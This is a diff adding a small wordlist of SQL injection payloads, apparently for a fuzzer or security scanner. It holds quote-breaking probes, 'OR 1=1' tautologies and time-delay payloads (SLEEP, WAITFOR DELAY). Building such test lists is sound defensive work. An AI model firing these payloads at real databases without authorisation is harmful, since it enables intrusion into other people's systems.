@@ -1,0 +1,8 @@
+# SQL Injection payloads — one per line. Lines starting with # are ignored.
+'
+"
+'--
+' OR 1=1--
+') OR ('1'='1
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
